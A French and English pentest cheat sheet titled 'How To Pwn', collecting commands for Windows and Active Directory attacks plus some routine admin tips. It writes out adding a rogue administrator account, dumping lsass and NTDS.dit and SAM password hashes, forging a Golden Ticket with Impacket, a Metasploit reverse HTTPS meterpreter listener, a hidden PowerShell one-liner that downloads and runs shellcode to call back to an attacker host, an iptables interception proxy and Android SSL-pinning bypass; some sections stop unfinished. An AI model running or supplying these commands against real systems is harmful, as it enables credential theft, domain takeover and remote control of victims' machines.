# How To Pwn

Des petits tutos pour bien utiliser les différents outils.





## How To - Every ways of PSExec


### add a local user account

```
net user /add jdupond AWNzcek2382OD
net localgroup administrators jdupond /add
net localgroup administrators CONTOSO\jdurand /add
```

### procdump lsass.exe

```
psexec.py -c procdump.exe "$domain/$domuser:$userpassword@$cible" "-acceptEula -ma lsass.exe C:/windows/lsass.dmp"
smbget -w $domain -U $domuser%$userpassword smb://$cible/ADMIN$/lsass.dmp
psexec.py "$domain/$domuser:$userpassword@$cible" "del C:/windows/lsass.dmp" 
```


## How To - récupérer les passwords de tous les users de l'AD

Comment récupérer les hashes puis les mots de passe des comptes utilisateurs d'un Active Directory.

Note : cette méthode est totalement déprécié par CrackMapExec.

### dumper les fichiers ntds.dit et SYSTEM depuis un DC

voir shadow copy

```
vssadmin create shadow
[…]
vssadmin delete shadows
```

### convertir le fichier ntds.dit

pour sortir les tables intéressantes de la "main database of Active Directory".

* [download](http://pkgs.fedoraproject.org/repo/pkgs/libesedb/libesedb-alpha-20120102.tar.gz/198a30c98ca1b3cb46d10a12bef8deaf/libesedb-alpha-20120102.tar.gz)

`~/tools/libesedb-20120102/esedbtools/esedbexport ntds.dit`

### Sortir les hashes des utilisateurs


* [site officiel](http://www.ntdsxtract.com/)
* [download](http://www.ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip)

`python ~/tools/NTDSXtract\ 1.0/dsusers.py ntds.dit.export/datatable.3 ntds.dit.export/link_table.5 --passwordhashes SYSTEM_ad --passwordhistory SYSTEM_ad > ad_full_extract_1`

`~/git/ntdsxtract/dsusers.py datatable.3 link_table.4 ./ --syshive SYSTEM_ad --passwordhashes --passwordhistory --pwdformat ocl --lmoutfile tel_lm --ntoutfile tel_nt`



















## How To - Create and Use a Golden Ticket

You will need:

* The FQDN of the domain: `fra.evilcorp.lab2`
* The SID of the domain: `S-1-5-21-2894840767-735700-3593130334`
* The NTLM hash of the `krbtgt` account: `25619bab39a137291b536a7bf42c6780`
* The `samAccountName` of the user to impersonate (preferably a domain admin): `Administrator`


### With Impacket from Linux


Create the ticket.
`ticketer.py -nthash 25619bab39a137291b536a7bf42c6780 -domain-sid S-1-5-21-2894840767-735700-3593130334 -domain fra.evilcorp.lab2 Administrator`
```
Impacket v0.9.19-dev - Copyright 2019 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for fra.evilcorp.lab2/Administrator
[*]   PAC_LOGON_INFO
[*]   PAC_CLIENT_INFO_TYPE
[*]   EncTicketPart
[*]   EncAsRepPart
[*] Signing/Encrypting final ticket
[*]   PAC_SERVER_CHECKSUM
[*]   PAC_PRIVSVR_CHECKSUM
[*]   EncTicketPart
[*]   EncASRepPart
[*] Saving ticket in Administrator.ccache
```

That will create a file `Administrator.ccache` in the current directory.

Export a variable of the file:
`export KRB5CCNAME=/home/user/Administrator.ccache`

Use it:
`psexec.py -dc-ip 192.168.58.11 -target-ip 192.168.58.11 -no-pass -k fra.evilcorp.lab2/Administrator@192.168.58.11`

### With Mimikatz from Windows

Open Mimikatz and fire the commands:

Create a golden ticket and save it to a file in current directory:



























## How To − Malware phising

Lancer un listener metasploit qui enverra un meterpreter qui fera un callback HTTPS :
```
cd /opt/metasploit/
sudo app/msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter_reverse_https
set LHOST xxx.xxx.xxx.xxx (ip accessible depuis internet)
set LPORT 443
exploit -j -z
```

On peut ensuite voir les `sessions` et les `jobs`.



```
powershell -nop -windowstyle hidden -NonInteractive -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/code_execution/Invoke-Shellcode.ps1');invoke-shellcode -Payload windows/meterpreter/reverse_https -Lhost xxx.xxx.xxx.xxx -Lport 8080
```

## How To - proxy transparent avec burp

La victime est une VM en mode "host only" mais ça serait pareil avec une machine sur un wifi ou un réseau cablé.

L'idée est de rajouter des règles de NAT pour rediriger uniquement le trafic voulu vers notre burp.

* Configurer Burp pour qu'il écoute en mode transparent (voir [ici](http://portswigger.net/burp/help/proxy_options_invisible.html)) pour comprendre pourquoi), pour cela il suffit de cocher la case "invisible" dans l'option du listener
* autoriser l'IP forward

```
sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
```

* rajouter des règles de firewall

```bash
linuxInterne='192.168.56.1'
linuxExterne='10.35.12.131'
victime='192.168.56.101'
siteWeb='217.108.170.54'
# au cas où
sudo iptables -P FORWARD ACCEPT
# flush la table de nat
sudo iptables -t nat -F
# source NAT de tout le reste pour que ça puisse revenir
sudo iptables -t nat -A POSTROUTING -s $victime -j SNAT --to-source $linuxExterne
# redirection des connexions vers $site_web:443 vers notre burp local
sudo iptables -t nat -A PREROUTING -s $victime -d $siteWeb -p tcp --dport 443 -j DNAT --to-destination $linuxInterne:8080
```

* dans la VM il faut rajouter la route par défaut et peut-être le serveur DNS. Terminal administrateur puis :

`route add 0.0.0.0 mask 0.0.0.0 192.168.56.1`
`netsh interface ipv4 add dnsserver "Connexion au réseau local" address=10.35.12.2 index=1`

* profit!

## How To - Lister les réseaux Wi-Fi environnants


``` bash
sudo airmon-ng check wlan0
sudo airodump-ng mon0
[…]
sudo airmon-ng stop mon0
```




















## How To - mount a VDI disk image

Pour monter un disque d'une machine virtuelle (VM) créée avec VirtualBox, il est possible d'utiliser qemu-nbd :

```
sudo aptitude install qemu-kvm
sudo modprobe nbd
sudo qemu-nbd -c /dev/nbd0 image.vdi
sudo mkdir /media/disk_vm
sudo mount /dev/nbd0p1 /media/disk_vm
((( do stuff )))
sudo umount /media/disk_vm
sudo rmdir /media/disk_vm
sudo qemu-nbd -d /dev/nbd0
sudo rmmod nbd
```

[source](https://bethesignal.org/blog/2011/01/05/how-to-mount-virtualbox-vdi-image/)



## How To - dump avec Wireshark en user

Pour capturer en tant qu'utilisateur avec wireshark il faut reconfigurer pour ajouter le groupe wireshark au système :
`sudo dpkg-reconfigure wireshark`
puis s'ajouter au groupe.
(si on veut pas relancer la session, un petit `sudo su - <username>` et le tour est joué.)



## How To - recover passwords and secrets of local accounts on Windows

### new - method 1

Il faut récupérer les fichiers `SAM`, `SYSTEM`, et `SECURITY` dans `WINDOWS/system32/config/` et les extraire avec `creddump7` :

```
~/git/creddump7/pwdump.py SYSTEM SAM > pwdump.txt
~/git/creddump7/cachedump.py SYSTEM SECURITY true > cachedump.txt
~/git/creddump7/lsadump.py SYSTEM SECURITY true > lsadump.txt
```


Voir aussi RedSnarf


### old - method 2

```
bkhive WINDOWS/system32/config/system ~/winXPAD_syskey.txt
samdump2 WINDOWS/system32/config/SAM ~/winXPAD_syskey.txt > ~/winXPAD_hashes.txt
```

Y'a plus qu'à cracker les hashes du fichier `~/winXPAD_hashes.txt` !


## How To - Create a dm-crypt encrypted file

Utile pour créer un conteneur chiffré pour protéger les données PASSI par exemple.

### Création

Création d'un fichier de 3 Go formaté en ext4 :

```
fallocate -l 3G conteneur.img
cryptsetup luksFormat conteneur.img
sudo cryptsetup luksOpen conteneur.img monImage
sudo mkfs.ext4 /dev/mapper/monImage
sudo cryptsetup luksClose monImage
```

### Utilisation

Montage :
```
sudo cryptsetup luksOpen conteneur.img monImage
sudo mount /dev/mapper/monImage conteneur/
```

Démontage :
```
sudo umount conteneur/
sudo cryptsetup luksClose monImage
```


## HowTo - Mettre en place frida sur un téléphone Android

#### 1. S'assurer que le téléphone est rooté
et si c'est le cas, ne pas oublier d'activer l'option "accès root" dans les options développeurs

#### 2. Vérifier que adb fonctionne**
Il est possible de connecter le téléphone en USB ou bien d'activer le débogage par réseau.
TODO : expliquer la partie pour activer le débogage par réseau à l'aide de la commande `adb tcpip 4444`
Note : avec Virtualbox et la kali en VM, les options usb sont restés en mode USB 2.0 et le cable utilisé était un câble USB 2.0 malgré qu'il soit sur un port USB 3.0.

#### 3. Démarrer adb en mode root
sinon il n'est pas possible d'accéder aux autres applications : `adb root`

#### 4. Envoyer et démarrer le démon frida !**

* Le récupérer sur https://github.com/frida/frida/releases et prendre la version `frida-server-x.x.x-android-arm.xz` ou `frida-server-x.x.x-android-arm64.xz` en fonction de l'architecture du téléphone (ou même les versions x86 si besoin).
* L'envoyer sur le téléphone : `adb push frida-server-x.x.x-android-arm.xz /data/local/tmp/frida-server`
* Le lancer en root `adb shell /data/local/tmp/frida-server` (pour s'assurer que le shell adb a bien les permissions root, il est possible de faire `adb shell id`)

#### 5. Installer le client sur kali

```bash
sudo apt update
sudo apt install android-tools-adb android-tools-fastboot
sudo usermod -a -G plugdev joe # si l'utilisateur n'appartient pas encore au groupe plugdev
sudo su - joe # pour recharger les permissions
```

#### 6. Profit!

Il est maintenant possible de :

* lister les devices : `frida-ls-devices`
* lister tous les processus : `frida-ps -U`
* lister les applications : `frida-ps -Ua`
* etc…

(Le `-U` est utilisé car le téléphone est branché en USB)



## HowTo - Outrepasser le SSL pinning dans une application Android

#### 0. 0b10 façons de faire
 
* Nativement, on liste les applications qui tournent (`frida-ps -Ua`) puis on s'y attache (`frida-trace -U com.example.app`).
Mais parfois ça ne fonctionne pas, et ça necessite de lancer frida en root (pas toujours possible).

* Via frida-gadget. Cela demande d'insérer le "Gadget" dans l'application mais permet de l'utiliser sans root.
C'est cette méthode qui sera décrite ici.

#### 1. S'assurer que frida est fonctionnel
Voir le HowTo sur frida et android

#### 2. Décompresser l'application
```bash
apktool d example.apk -o apktool_output
```

#### 3. Insérer le gadget

* Télécharger le gadget adéquat : https://github.com/frida/frida/releases et prendre la version `frida-gadget-12.0.8-android-arm64.so.xz` ou `frida-gadget-12.0.8-android-arm64.so.xz`.




